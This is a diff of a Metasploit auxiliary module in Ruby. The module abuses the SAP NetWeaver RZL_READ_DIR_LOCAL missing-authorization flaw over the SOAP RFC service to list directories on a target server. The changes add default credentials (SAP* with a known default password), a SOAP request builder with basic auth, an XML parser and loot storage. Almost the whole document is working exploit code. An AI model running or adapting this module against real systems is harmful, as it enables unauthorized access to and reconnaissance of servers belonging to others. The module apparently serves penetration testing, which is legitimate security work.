@@ -31,23 +31,43 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'RZL_READ_DIR_LOCAL (directory listing and SMB relay)',
+			'Name' => 'SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing',
 			'Description' => %q{
-								This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL Missing Authorization Check And SMB Relay Vulnerability.
-								SAP Note 1595074 / DSECRG-12-026.
-								RZL_READ_DIR_LOCAL returns the file names in a given directory. It returns only the first 32 characters of a filename (truncated).
-								},
-			'References' => [['URL','http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/']],
-			'Author' => ['nmonkee'],
+					This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL function, on the SAP
+				SOAP RFC Service, to enumerate directory contents. It returns only the first 32
+				characters of the filename since they are truncated.
+			},
+			'References' => [
+				[ 'OSVDB', '92732'],
+				[ 'URL', 'http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/' ]
+			],
+			'Author' =>
+				[
+					'Alexey Tyurin', # Vulnerability discovery
+					'nmonkee' # Metasploit module
+				],
 			'License' => MSF_LICENSE
-			)
+		)
 
 		register_options([
-			OptString.new('CLIENT', [true, 'SAP client', nil]),
-			OptString.new('USER', [true, 'Username', nil]),
-			OptString.new('PASS', [true, 'Password', nil]),
-			OptString.new('PATH',[true,'File path (e.g. \\xx.xx.xx.xx\share)','c:\\'])
-			], self.class)
+			OptString.new('CLIENT', [true, 'SAP Client', '001']),
+			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+			OptString.new('PASSWORD', [true, 'Password', '06071992']),
+			OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
+		], self.class)
+	end
+
+	def parse_xml(xml_data)
+		files = []
+		xml_doc  = Nokogiri::XML(xml_data)
+		xml_doc.css('item').each {|item|
+			name = item.css('NAME')
+			size = item.css('SIZE')
+			if not name.empty? and not size.empty?
+				files << { "name" => name.text, "size" => size.text }
+			end
+		}
+		return files
 	end
 
 	def run_host(ip)
@@ -64,32 +84,39 @@ class Metasploit4 < Msf::Auxiliary
 		data << '<SIZE></SIZE>'
 		data << '</item>'
 		data << '</FILE_TBL>'
-		data << '<NAME>' + datastore['PATH'] + '</NAME>'
+		data << '<NAME>' + datastore['DIR'] + '</NAME>'
 		data << '</RZL_READ_DIR_LOCAL>'
 		data << '</SOAP-ENV:Body>'
 		data << '</SOAP-ENV:Envelope>'
-		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
+
 		begin
-			print_status("[SAP] #{ip}:#{rport} - sending request for #{datastore['PATH']}")
-			res = send_request_raw({
-				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+			vprint_status("#{rhost}:#{rport} - Sending request to enumerate #{datastore['DIR']}")
+			res = send_request_cgi({
+				'uri' => '/sap/bc/soap/rfc',
 				'method' => 'POST',
 				'data' => data,
-				'headers' =>{
-					'Content-Length' => data.size.to_s,
+				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+				'ctype' => 'text/xml; charset=UTF-8',
+				'headers' => {
 					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-					'Authorization' => 'Basic ' + user_pass,
-					'Content-Type' => 'text/xml; charset=UTF-8',}
-					}, 45)
-			if res
-				vprint_error("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
+				},
+				'vars_get' => {
+					'sap-client' => datastore['CLIENT'],
+					'sap-language' => 'EN'
+				}
+			})
+			if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
+				files = parse_xml(res.body)
+				path = store_loot("sap.soap.rfc.dir", "text/xml", rhost, res.body, datastore['DIR'])
+				print_good("#{rhost}:#{rport} - #{datastore['DIR']} successfully enumerated, results stored on #{path}")
+				files.each { |f|
+					vprint_line("Entry: #{f["name"]}, Size: #{f["size"].to_i}")
+				}
 			end
-			rescue ::Rex::ConnectionError
-				print_error("#{rhost}:#{rport} - Unable to connect")
-				return
-			end
+		rescue ::Rex::ConnectionError
+			vprint_error("#{rhost}:#{rport} - Unable to connect")
+			return
 		end
 	end
+end
